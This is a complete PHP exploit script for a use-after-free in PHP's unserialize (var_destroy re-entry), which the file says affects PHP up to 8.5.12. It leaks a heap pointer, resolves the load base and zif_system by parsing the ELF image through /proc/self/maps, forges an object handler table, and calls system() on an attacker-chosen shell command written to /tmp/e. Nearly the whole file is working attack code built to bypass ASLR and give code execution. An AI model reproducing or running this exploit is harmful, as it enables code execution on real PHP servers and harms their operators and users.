<?php
// pwn_zero4_universal.php — zero4 RCE, unconditional ASLR bypass.
// No gdb, no baked addresses, no per-build offset argv.
//
// Same bug and same heap dance as pwn_zero4_live.php (var_destroy re-entry
// UAF, released PHP through 8.5.12, fixed upstream 08f4b64). The live file
// still does `base = oracle - OFF_EMPTY` and `zif = base + OFF_ZIF`, and it
// plants zif_system only at the 8.5 handler slots (+16 / +136 / +160).
// 8.1.2 is +128 / +152. Those two numbers are the whole per-build table.
//
// The strlen oracle already returns the ABSOLUTE address of zend_empty_array.
// This file turns that pointer into a load bias without guessing the offset:
//   1. /proc/self/maps names the VMA that contains the pointer (the leak is
//      still the ASLR bypass; maps only translates a pointer we already have).
//   2. Load bias = vma_start - (p_vaddr + (vma_off - p_offset)) for the
//      PT_LOAD that covers that file offset. Runtime ELF header is bias +
//      the link address of file offset 0. PIE and ET_EXEC share this.
//   3. zif_system is the zend_function_entry walk from extract_syms.py:
//      fname pointer in a non-exec PT_LOAD, handler in an exec PT_LOAD.
//      Standalone "system\0" (previous byte NUL) is tried first — that is
//      what extract_syms.py does, and it is right on plain2. Ubuntu's php8.1
//      ld merges that C string onto a longer rodata tail ("0.system"), so
//      the previous byte is not NUL and extract_syms.py reports NOT FOUND.
//      The second pass accepts those suffix hits. RELA R_X86_64_RELATIVE is
//      the fallback when the place bytes are zero. runtime = bias + link.
//   4. Every zend_object_handlers pointer from +8 through +0x180 is that
//      address. +0 stays offset 0 (int+pad on 8.1..8.5, size_t on later).
//      var_dump's first call is get_class_name(obj); 8.1 has it at +128 and
//      8.5 (clone_obj_with inserted) at +136. Both land in the fill.
//   5. The existing R:1023 read still has to show \x7fELF at BASE+0 or we
//      do not call.
//
// Heap: the resolver reads the ELF in 1024-byte chunks. A zend_string of
// that size stays in the small bin (<=3072). No large-page run is freed
// before the walk frees block2, so the 8160B (2-page) reclaim is unchanged.
// The image buffer is gone before unset($arr).
//
// pat length stays 2040. str_repeat($pat, 4) == 8160. Block2 = leak - 5056.
// Spacing must be 128. FIRE dtor is still walk slot 19.
//
// usage:
//   php -n pwn_zero4_universal.php [attempts] [cmd]
// cmd is the shell body written to /tmp/e (default: id > /tmp/pwned_zero4_universal).
// The forged call is system("sh /tmp/e"). No offset arguments.
//
// Receipt the resolver without the UAF. "self" picks a file-backed pointer
// from this process's own maps (a foreign address is a different ASLR slide):
//   PWN_ZERO4_DRY=1 PWN_ZERO4_ADDR=self php -n pwn_zero4_universal.php
//   PWN_ZERO4_DRY=1 PWN_ZERO4_ADDR=link:544f00 php -n pwn_zero4_universal.php
// link:<hex> re-resolves (base of this process + that link address), which is
// how a leaked zend_empty_array sits in the data/BSS VMA.

// ---- ELF / maps (no large allocs) ----

function pun16(string $b, int $o): int {
    return unpack('v', substr($b, $o, 2))[1];
}
function pun32(string $b, int $o): int {
    return unpack('V', substr($b, $o, 4))[1];
}
function pun64(string $b, int $o): ?int {
    $v = unpack('P', substr($b, $o, 8))[1];
    return is_int($v) ? $v : null;
}

function pread($fh, int $off, int $n): ?string {
    if ($off < 0 || $n < 1) return null;
    if (fseek($fh, $off) !== 0) return null;
    $b = fread($fh, $n);
    if (!is_string($b) || strlen($b) !== $n) return null;
    return $b;
}

/** File offsets of $needle. 1024B reads, overlap kept so a hit can span a chunk. */
function scan_file($fh, int $size, string $needle): array {
    $nlen = strlen($needle);
    if ($nlen < 1 || fseek($fh, 0) !== 0) return [];
    $prev = '';
    $off = 0;
    $hits = [];
    $seen = [];
    while ($off < $size) {
        $chunk = fread($fh, 1024);
        if (!is_string($chunk) || $chunk === '') break;
        $buf = $prev . $chunk;
        $bufOff = $off - strlen($prev);
        $i = 0;
        $limit = strlen($buf);
        while ($i < $limit && ($j = strpos($buf, $needle, $i)) !== false) {
            $abs = $bufOff + $j;
            if ($abs >= 0 && !isset($seen[$abs])) {
                $seen[$abs] = true;
                $hits[] = $abs;
            }
            $i = $j + 1;
        }
        $prev = strlen($buf) > $nlen ? substr($buf, -$nlen) : $buf;
        $off += strlen($chunk);
        if (strlen($chunk) < 1024) break;
    }
    return $hits;
}

function parse_loads($fh, string $hdr): ?array {
    if (strlen($hdr) < 64 || substr($hdr, 0, 4) !== "\x7fELF") return null;
    if (ord($hdr[4]) !== 2 || ord($hdr[5]) !== 1) return null; // ELF64 LE
    if (pun16($hdr, 18) !== 62) return null;                   // EM_X86_64
    $etype = pun16($hdr, 16);
    if ($etype !== 2 && $etype !== 3) return null;             // EXEC or DYN
    $phoff = pun64($hdr, 0x20);
    $phentsize = pun16($hdr, 0x36);
    $phnum = pun16($hdr, 0x38);
    if ($phoff === null || $phentsize < 56 || $phnum < 1 || $phnum > 128) return null;
    $segs = [];
    for ($i = 0; $i < $phnum; $i++) {
        $ph = pread($fh, $phoff + $i * $phentsize, 56);
        if ($ph === null) return null;
        if (pun32($ph, 0) !== 1) continue; // PT_LOAD
        $flags = pun32($ph, 4);
        $po = pun64($ph, 8);
        $va = pun64($ph, 16);
        $filesz = pun64($ph, 32);
        $memsz = pun64($ph, 40);
        if ($po === null || $va === null || $filesz === null || $memsz === null) return null;
        $segs[] = ['off' => $po, 'vaddr' => $va, 'filesz' => $filesz, 'memsz' => $memsz, 'flags' => $flags];
    }
    if (!$segs) return null;
    return ['etype' => $etype, 'segs' => $segs];
}

function off_to_va(array $segs, int $foff): ?array {
    foreach ($segs as $s) {
        if ($foff >= $s['off'] && $foff < $s['off'] + $s['filesz']) {
            return [$s['vaddr'] + ($foff - $s['off']), $s['flags']];
        }
    }
    return null;
}

function va_to_off(array $segs, int $va): ?int {
    foreach ($segs as $s) {
        if ($va >= $s['vaddr'] && $va < $s['vaddr'] + $s['filesz']) {
            return $s['off'] + ($va - $s['vaddr']);
        }
    }
    return null;
}

/** PT_LOAD covering a maps file-offset. memsz so a BSS tail still matches. */
function covering_load(array $segs, int $vmaOff): ?array {
    $loose = null;
    foreach ($segs as $s) {
        $span = $s['memsz'] > $s['filesz'] ? $s['memsz'] : $s['filesz'];
        if ($span <= 0) continue;
        $po = $s['off'];
        if ($vmaOff >= $po && $vmaOff < $po + $span) return $s;
        $poPage = $po & ~4095;
        if ($loose === null && $vmaOff >= $poPage && $vmaOff < $po + $span) $loose = $s;
    }
    return $loose;
}

/** @return list<array{va:int,solo:bool}> link vaddrs of the bytes system\\0 */
function find_system_vas($fh, int $size, array $segs): array {
    $out = [];
    foreach (scan_file($fh, $size, "system\0") as $abs) {
        $ov = off_to_va($segs, $abs);
        if ($ov === null) continue;
        $solo = false;
        if ($abs > 0) {
            $prev = pread($fh, $abs - 1, 1);
            $solo = $prev === "\0";
        }
        $out[] = ['va' => $ov[0], 'solo' => $solo];
    }
    return $out;
}

function system_vas(array $all, bool $soloOnly): array {
    $vas = [];
    foreach ($all as $s) {
        if ($soloOnly && !$s['solo']) continue;
        $vas[] = $s['va'];
    }
    return $vas;
}

/** extract_syms.py find_zif_system, in place-byte order. Returns link vaddr. */
function find_zif_place($fh, int $size, array $segs, array $vas): ?int {
    foreach ($vas as $sv) {
        foreach (scan_file($fh, $size, pack('P', $sv)) as $j) {
            $ev = off_to_va($segs, $j);
            if ($ev === null || ($ev[1] & 1) !== 0) continue; // entry must be non-exec
            $hb = pread($fh, $j + 8, 8);
            if ($hb === null) continue;
            $handler = pun64($hb, 0);
            if ($handler === null || $handler < 0x10000) continue;
            $hoff = va_to_off($segs, $handler);
            if ($hoff === null) continue;
            $hv = off_to_va($segs, $hoff);
            if ($hv !== null && ($hv[1] & 1) !== 0) return $handler;
        }
    }
    return null;
}

function rela_ranges($fh, string $hdr, int $size): array {
    $shoff = pun64($hdr, 0x28);
    $shentsize = pun16($hdr, 0x3a);
    $shnum = pun16($hdr, 0x3c);
    if ($shoff === null || $shoff === 0 || $shentsize < 64 || $shnum < 1 || $shnum > 512) return [];
    $out = [];
    for ($si = 0; $si < $shnum; $si++) {
        $sh = pread($fh, $shoff + $si * $shentsize, 64);
        if ($sh === null) break;
        if (pun32($sh, 4) !== 4) continue; // SHT_RELA
        $soff = pun64($sh, 24);
        $ssize = pun64($sh, 32);
        $sent = pun64($sh, 56);
        if ($soff === null || $ssize === null || $sent === null) continue;
        if ($sent < 24) $sent = 24;
        if ($ssize < 24 || $soff < 0 || $soff + $ssize > $size) continue;
        if (intdiv($ssize, $sent) > 2000000) continue;
        $out[] = [$soff, $ssize, $sent];
    }
    return $out;
}

/**
 * Walk RELA in 1024B chunks. $pick is r_addend => true (fname sites) or
 * r_offset => true (handler slots). Returns matching [r_offset, r_addend].
 */
function rela_collect($fh, array $ranges, array $pick, string $by): array {
    $hits = [];
    foreach ($ranges as [$soff, $ssize, $sent]) {
        $carry = '';
        $done = 0;
        while ($done < $ssize) {
            $wantn = 1024;
            if ($wantn > $ssize - $done) $wantn = $ssize - $done;
            if (fseek($fh, $soff + $done) !== 0) break;
            $chunk = fread($fh, $wantn);
            if (!is_string($chunk) || $chunk === '') break;
            $done += strlen($chunk);
            $buf = $carry . $chunk;
            $usable = intdiv(strlen($buf), $sent) * $sent;
            for ($p = 0; $p + 24 <= $usable; $p += $sent) {
                $rOff = pun64($buf, $p);
                $rInfo = pun64($buf, $p + 8);
                $rAdd = pun64($buf, $p + 16);
                if ($rOff === null || $rInfo === null || $rAdd === null) continue;
                if (($rInfo & 0xffffffff) !== 8) continue; // R_X86_64_RELATIVE
                $key = $by === 'addend' ? $rAdd : $rOff;
                if (isset($pick[$key])) $hits[] = [$rOff, $rAdd];
            }
            $carry = $usable < strlen($buf) ? substr($buf, $usable) : '';
        }
    }
    return $hits;
}

function handler_in_exec(array $segs, int $handler): bool {
    if ($handler < 0x10000) return false;
    $hoff = va_to_off($segs, $handler);
    if ($hoff === null) return false;
    $hv = off_to_va($segs, $hoff);
    return $hv !== null && ($hv[1] & 1) !== 0;
}

function find_zif_rela($fh, int $size, string $hdr, array $segs, array $vas): ?int {
    if (!$vas) return null;
    $ranges = rela_ranges($fh, $hdr, $size);
    if (!$ranges) return null;
    $want = [];
    foreach ($vas as $va) $want[$va] = true;
    $fnames = rela_collect($fh, $ranges, $want, 'addend');
    if (!$fnames) return null;
    $need = [];
    foreach ($fnames as [$rOff, $_]) $need[$rOff + 8] = true;
    $handlers = [];
    foreach (rela_collect($fh, $ranges, $need, 'offset') as [$rOff, $rAdd]) {
        $handlers[$rOff] = $rAdd;
    }
    foreach ($fnames as [$rOff, $_]) {
        $slot = $rOff + 8;
        if (isset($handlers[$slot])) {
            $handler = $handlers[$slot];
        } else {
            $foff = va_to_off($segs, $slot);
            if ($foff === null) continue;
            $hb = pread($fh, $foff, 8);
            if ($hb === null) continue;
            $handler = pun64($hb, 0);
            if ($handler === null) continue;
        }
        if (handler_in_exec($segs, $handler)) return $handler;
    }
    return null;
}

function read_maps(): ?array {
    $txt = @file_get_contents('/proc/self/maps');
    if (!is_string($txt) || $txt === '') return null;
    $vmas = [];
    foreach (explode("\n", $txt) as $line) {
        if ($line === '') continue;
        if (!preg_match(
            '/^([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+([0-9a-f]+)\s+\S+\s+\d+\s*(.*)$/',
            $line, $m
        )) continue;
        $start = hexdec($m[1]);
        $end = hexdec($m[2]);
        $off = hexdec($m[4]);
        if (!is_int($start) || !is_int($end) || !is_int($off)) continue;
        $path = rtrim($m[5], "\r");
        if (str_ends_with($path, ' (deleted)')) {
            $path = substr($path, 0, -strlen(' (deleted)'));
        }
        $vmas[] = [
            'start' => $start, 'end' => $end, 'perms' => $m[3],
            'off' => $off, 'path' => $path,
        ];
    }
    return $vmas;
}

function vma_of(array $vmas, int $addr): ?array {
    foreach ($vmas as $v) {
        if ($addr >= $v['start'] && $addr < $v['end']) return $v;
    }
    return null;
}

/**
 * @return ?array{base:int,zif:int,off_empty:int,off_zif:int,path:string,bias:int,etype:int,via:string}
 */
function resolve_image(int $emptyAbs, bool $alsoRela = false): ?array {
    $vmas = read_maps();
    if ($vmas === null) { echo "M2-BAIL /proc/self/maps missing\n"; return null; }
    $vma = vma_of($vmas, $emptyAbs);
    if ($vma === null) { echo "M2-BAIL oracle address not mapped\n"; return null; }
    $path = $vma['path'];
    if ($path === '' || $path[0] !== '/') {
        echo "M2-BAIL oracle VMA has no ELF path perms=", $vma['perms'], "\n";
        return null;
    }
    $fh = fopen($path, 'rb');
    if ($fh === false) { echo "M2-BAIL cannot read $path\n"; return null; }
    $size = filesize($path);
    $hdr = ($size !== false && $size >= 64) ? pread($fh, 0, 64) : null;
    $img = $hdr !== null ? parse_loads($fh, $hdr) : null;
    if ($img === null || !is_int($size)) {
        fclose($fh);
        echo "M2-BAIL not an ELF64 LE x86_64: $path\n";
        return null;
    }
    $segs = $img['segs'];
    $seg = covering_load($segs, $vma['off']);
    if ($seg === null) {
        fclose($fh);
        echo "M2-BAIL no PT_LOAD covers oracle VMA off=0x", dechex($vma['off']), "\n";
        return null;
    }
    $link = $seg['vaddr'] + ($vma['off'] - $seg['off']);
    $bias = $vma['start'] - $link;

    $elfSeg = null;
    foreach ($segs as $s) {
        if ($s['off'] <= 0 && $s['filesz'] > 0) { $elfSeg = $s; break; }
    }
    if ($elfSeg === null) {
        fclose($fh);
        echo "M2-BAIL no PT_LOAD contains file offset 0\n";
        return null;
    }
    $base = $bias + ($elfSeg['vaddr'] - $elfSeg['off']);
    if (($base & 0xfff) !== 0) {
        fclose($fh);
        echo "M2-BAIL base misaligned 0x", dechex($base), "\n";
        return null;
    }
    $baseVma = vma_of($vmas, $base);
    $baseFile = $baseVma === null ? -1 : $baseVma['off'] + ($base - $baseVma['start']);
    if ($baseVma === null || $baseVma['path'] !== $path || $baseFile !== 0) {
        fclose($fh);
        echo "M2-BAIL base 0x", dechex($base), " is not file offset 0 of $path\n";
        return null;
    }
    if ($emptyAbs <= $base) {
        fclose($fh);
        echo "M2-BAIL oracle is not above the ELF header\n";
        return null;
    }

    $all = find_system_vas($fh, $size, $segs);
    // Solo first (extract_syms.py). Suffix second (ld-merged "system" tail).
    $place = find_zif_place($fh, $size, $segs, system_vas($all, true));
    $via = 'place';
    if ($place === null) {
        $place = find_zif_place($fh, $size, $segs, system_vas($all, false));
        $via = 'place-merge';
    }
    $rela = null;
    if ($place === null || $alsoRela) {
        $rela = find_zif_rela($fh, $size, $hdr, $segs, system_vas($all, true));
        if ($rela === null) {
            $rela = find_zif_rela($fh, $size, $hdr, $segs, system_vas($all, false));
        }
    }
    fclose($fh);

    if ($place !== null) {
        $zif = $place;
    } elseif ($rela !== null) {
        $zif = $rela;
        $via = 'rela';
    } else {
        echo "M2-BAIL zif_system not in $path\n";
        return null;
    }
    $runtime = $bias + $zif;
    if ($alsoRela && $place !== null && $rela !== null && $place !== $rela) {
        echo "M2-NOTE place=0x", dechex($place), " rela=0x", dechex($rela), " (using place)\n";
    }

    $exec = null;
    foreach ($vmas as $v) {
        if ($v['path'] === $path && str_contains($v['perms'], 'x')
            && $runtime >= $v['start'] && $runtime < $v['end']) {
            $exec = $v;
            break;
        }
    }
    if ($exec === null) {
        echo "M2-BAIL zif 0x", dechex($runtime), " not in an exec VMA of $path\n";
        return null;
    }
    $seg2 = covering_load($segs, $exec['off']);
    if ($seg2 === null) {
        echo "M2-BAIL exec VMA matches no PT_LOAD\n";
        return null;
    }
    $bias2 = $exec['start'] - ($seg2['vaddr'] + ($exec['off'] - $seg2['off']));
    if ($bias2 !== $bias) {
        echo "M2-BAIL text/data load bias disagree\n";
        return null;
    }

    return [
        'base' => $base,
        'zif' => $runtime,
        'off_empty' => $emptyAbs - $base,
        'off_zif' => $runtime - $base,
        'path' => $path,
        'bias' => $bias,
        'etype' => $img['etype'],
        'via' => $via,
    ];
}

$DRY = getenv('PWN_ZERO4_DRY');
if ($DRY === '1') {
    $hex = getenv('PWN_ZERO4_ADDR');
    if (!is_string($hex) || $hex === '') {
        fwrite(STDERR, "PWN_ZERO4_ADDR=self or a hex pointer mapped in THIS process\n");
        exit(2);
    }
    $own = read_maps();
    $seed = 0;
    if ($own !== null) {
        foreach ($own as $v) {
            if ($v['path'] !== '' && $v['path'][0] === '/' && $v['off'] > 0) {
                $seed = $v['start'];
                break;
            }
        }
    }
    if ($hex === 'self') {
        $addr = $seed;
    } elseif (str_starts_with($hex, 'link:')) {
        $link = hexdec(substr($hex, 5));
        if (!is_int($link) || $seed <= 0) {
            fwrite(STDERR, "link: needs a hex link-address and a file mapping\n");
            exit(2);
        }
        $first = resolve_image($seed, false);
        if ($first === null) exit(1);
        $addr = $first['base'] + $link;
        echo "SEED base=0x", dechex($first['base']),
             " link=0x", dechex($link),
             " runtime=0x", dechex($addr), "\n";
    } else {
        $addr = hexdec($hex);
    }
    if (!is_int($addr) || $addr <= 0) {
        fwrite(STDERR, "PWN_ZERO4_ADDR not a mapped int\n");
        exit(2);
    }
    $img = resolve_image($addr, true);
    if ($img === null) exit(1);
    echo "base=0x", dechex($img['base']),
         " zif=0x", dechex($img['zif']),
         " off_empty=0x", dechex($img['off_empty']),
         " off_zif=0x", dechex($img['off_zif']),
         " bias=0x", dechex($img['bias']),
         " etype=", $img['etype'],
         " via=", $img['via'],
         " path=", $img['path'], "\n";
    exit(0);
}

$MARKER   = '/tmp/pwned_zero4_universal';
$ATTEMPTS = (int)($argv[1] ?? 5);
$BODY     = (string)($argv[2] ?? "id > $MARKER\n");
if (!str_ends_with($BODY, "\n")) $BODY .= "\n";

@unlink($MARKER);
file_put_contents('/tmp/e', $BODY);

class D { public static string $dp = ''; public static string $fp = ''; }
class E {
    public static int $block2 = 0;
    public static int $base = 0;
    public static int $zif = 0;
}

class Stage1 {
    public function __destruct() {
        $arr = unserialize(D::$dp);
        $blk = $arr[129];
        if ($blk === 5 || !is_int($blk) || $blk < 0x10000) {
            echo "DANCE-MISS (attempt skipped)\n"; return;
        }
        $block2 = $blk - 5056;
        echo "M1 block2 = 0x", dechex($block2), "\n";

        $u2 = unserialize('a:0:{}');
        $u3 = unserialize('a:0:{}');
        $u4 = unserialize('a:0:{}');
        $u5 = unserialize('a:0:{}');
        $vm5 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 1) { $vm5 = (int)$v; } }
        if ($vm5 < 0x10000) { echo "LEAK-MISS T_u5\n"; return; }

        $u6 = unserialize('a:0:{}');
        $u7 = unserialize('a:0:{}');
        $u8 = unserialize('a:0:{}');
        $u9 = unserialize('a:0:{}');
        $vs = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 2) { $vs = $v; } }

        $u10 = unserialize('a:0:{}');
        $len_s = strlen($vs);                     // *(&T_u9+16) = &zend_empty_array

        $u11 = unserialize('a:0:{}');
        $u12 = unserialize('a:0:{}');
        $u13 = unserialize('a:0:{}');
        $vm13 = 0; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 3) { $vm13 = (int)$v; } }

        $u14 = unserialize('a:0:{}');
        $u15 = unserialize('a:0:{}');
        $u16 = unserialize('a:0:{}');
        $u17 = unserialize('a:0:{}');
        $vs2 = ''; $i = -1;
        foreach ($arr as $k => $v) { $i++; if ($i === 4) { $vs2 = $v; } }
        $u18 = unserialize('a:0:{}');
        $len_s2 = strlen($vs2);

        echo "M2 T_u5=0x", dechex($vm5), " T_u13=0x", dechex($vm13),
             " spacing=", ($vm13 - $vm5), "\n";
        echo "M2 ORACLE1=0x", dechex($len_s), " ORACLE2=0x", dechex($len_s2), "\n";

        if ($vm13 - $vm5 !== 128) { echo "M2-BAIL slot spacing\n"; return; }
        if ($len_s !== $len_s2)   { echo "M2-BAIL oracle mismatch\n"; return; }
        if ($len_s < 0x10000)     { echo "M2-BAIL oracle pointer\n"; return; }

        // Big strings die with this call, before unset($arr) / the walk.
        $img = resolve_image($len_s, false);
        if ($img === null) return;

        E::$block2 = $block2;
        E::$base   = $img['base'];
        E::$zif    = $img['zif'];
        echo "M2-DONE base=0x", dechex($img['base']),
             " zif_system=0x", dechex($img['zif']),
             " off_empty=0x", dechex($img['off_empty']),
             " off_zif=0x", dechex($img['off_zif']),
             " via=", $img['via'],
             " ", $img['path'], "\n";
        unset($img);

        unset($arr);   // leave rc=1 held by dtor slot[1] => walk frees block2
        unserialize(D::$fp);
    }
}

class FIRE {
    public function __destruct() {
        $block2 = E::$block2; $base = E::$base; $ZIF = E::$zif;
        if (!$block2 || !$base || !$ZIF) { echo "FIRE-BAIL no statics\n"; return; }

        $V = function ($off) use ($block2) { return $block2 + 24 + $off; };
        $OBJ = $V(128); $HT = $V(600); $CE = $V(1600); $SMINI = $V(224);

        $MAGIC1 = 0x4142434445464748;
        $MAGIC2 = 0x1122334455667788;

        // Layout (pat[x] == block2+24+x == string val[x]; 2040 bytes total):
        //   pat[0..8]   data[1] -> fz1 @32 ; pat[8..16] data[2] -> fz2 @48
        //   pat[16..24] data[3] -> forge zval @64
        //   fz1 {str@80} len@96 = MAGIC1 ; fz2 {str@88} len@104 = MAGIC2
        //   forge {&OBJ, 0x108} @64 ; OBJ @128 ; SMINI @224 ; HT @600 ; CE @1600
        $pat  = pack('P', $V(32));                   // 0..8   data[1] = P1
        $pat .= pack('P', $V(48));                   // 8..16  data[2] = P2
        $pat .= pack('P', $V(64));                   // 16..24 data[3] = P3 (forge zval)
        $pat .= pack('P', $V(112));                  // 24..32 data[4] = P4 (fz3: ELF check)
        $pat .= pack('PVV', $V(80), 6, 0);           // 32..48 fz1: string @80
        $pat .= pack('PVV', $V(88), 6, 0);           // 48..64 fz2: string @88
        $pat .= pack('PVV', $OBJ, 0x108, 0);         // 64..80 forge zval {&OBJ, IS_OBJECT|RC}
        $pat .= str_repeat("\x00", 16);              // 80..96 str1 header (gc,h)
        $pat .= pack('P', $MAGIC1);                  // 96..104 str1.len
        $pat .= pack('P', $MAGIC2);                  // 104..112 str2.len (str2 header @88)
        $pat .= pack('PVV', $base - 16, 6, 0);       // 112..128 fz3: string @BASE-16 (len = *(BASE))
        // OBJ @128 (also the fake zend_execute_data, rdi):
        $pat .= pack('VV', 1, 0x208);                // +0  gc rc=1, IS_OBJECT|FREE_CALLED
        $pat .= pack('VV', 0, 0);                    // +8  handle, extra_flags
        $pat .= pack('P', $CE);                      // +16 ce -> zeros
        $pat .= pack('P', $HT);                      // +24 handlers -> table
        $pat .= pack('P', 0);                        // +32 properties
        $pat .= pack('P', 0x0000000100000000);       // +40 num_args=1 @+44
        $pat .= str_repeat("\x00", 32);              // +48..80
        $pat .= pack('PVV', $SMINI, 6, 0);           // +80 arg1 = {str, IS_STRING}
        // SMINI @224 (= OBJ+96):
        $pat .= pack('VV', 1, 0x16);                 // gc rc=1, GC_STRING
        $pat .= pack('P', 0);                        // h
        $pat .= pack('P', 9);                        // len = 9
        $pat .= "sh /tmp/e\x00";                     // val
        $pat .= str_repeat("\x00", 600 - 258);       // pad to HT @600
        // HANDLERS @600. +0 is the int/size_t offset (kept 0).
        // +8 .. +0x180 inclusive are zif_system:
        //   8.1.2 get_class_name +128, get_debug_info +152
        //   8.3/8.5 get_class_name +136, get_debug_info +160 (clone_obj_with at +32)
        // 48 pointers * 8 + 8 = 392. Ends at pat 992, below CE @1600.
        $h = pack('VV', 0, 0);
        for ($slot = 8; $slot <= 0x180; $slot += 8) {
            $h .= pack('P', $ZIF);
        }
        if (strlen($h) !== 392) { echo "HANDLER-LEN ", strlen($h), "\n"; return; }
        $pat .= $h;
        $pat .= str_repeat("\x00", 1600 - 992);      // CE zeros
        $pat .= str_repeat("\x00", 2040 - 1600);
        if (strlen($pat) !== 2040) { echo "PAT-LEN ", strlen($pat), "\n"; return; }

        $s = str_repeat($pat, 4);                    // 8160B: 2 pages, reclaims block2
        echo "M3-STR patlen=", strlen($pat), " strlen=", strlen($s),
             " first16=", bin2hex(substr($s, 0, 16)), "\n";
        flush();

        $c1z = unserialize('R:1020;');
        echo "M3-R1020-done\n"; flush();
        $c2z = unserialize('R:1021;');
        echo "M3-R1021-done\n"; flush();
        $c1 = strlen($c1z); $c2 = strlen($c2z);
        if ($c1 !== $MAGIC1 || $c2 !== $MAGIC2) {
            echo "RECLAIM-MISS c1=0x", dechex($c1), " c2=0x", dechex($c2), "\n";
            return;
        }
        echo "M3 string reclaim OK (canaries verified at block2)\n";

        $c3z = unserialize('R:1023;');
        echo "M3-R1023-done\n"; flush();
        $c3 = strlen($c3z);
        if (($c3 & 0x00FFFFFFFFFFFFFF) !== 0x00010102464c457f) {
            echo "M3-BAIL base ELF-magic mismatch: 0x", dechex($c3), "\n";
            return;
        }
        echo "M3 BASE verified via ELF magic at BASE+0\n"; flush();

        $r1 = unserialize('R:1022;');
        echo "M3 forged: OBJ=0x", dechex($OBJ), " HT=0x", dechex($HT),
             " zif_system=0x", dechex($ZIF), "\n";
        echo "TRIGGER var_dump(\$r1) -> zif_system(fake_execute_data)\n";
        var_dump($r1);
        echo "SURVIVED-CALL\n";
    }
}

// ---- payloads (same dance / same 1020-walk as the live file) ----
$d  = 'i:129;i:5;';
$d .= 'i:1028;i:1;';
$d .= 'i:8;s:8:"AAAAAAAA";';
$d .= 'i:10;i:1;';
$d .= 'i:12;s:8:"BBBBBBBB";';
for ($m = 5; $m <= 61; $m++) { $d .= 'i:' . (2 * $m + 4) . ';i:1;'; }
for ($j = 2; $j <= 65; $j++) { $d .= 'i:' . (256 * $j) . ';R:1;'; }
$d .= 'i:16896;i:1;';
D::$dp = 'a:127:{' . $d . '}';
D::$fp = 'O:4:"FIRE":0:{}';

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:9998;O:6:"Stage1":0:{}';
$els[] = 'i:9998;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';

for ($try = 1; $try <= $ATTEMPTS; $try++) {
    echo "=== attempt $try ===\n";
    $r = unserialize($payload);
    echo "outer ok=", var_export($r !== false, true), "\n";
    if (is_file($MARKER)) break;
}
if (is_file($MARKER)) {
    echo "MARKER $MARKER:\n", trim((string)file_get_contents($MARKER)), "\n";
    echo "[PASS] zero4 universal RCE: in-band, no gdb, no offset table, ASLR on\n";
} else {
    echo "[FAIL] marker missing\n";
}
echo "SCRIPT-END\n";
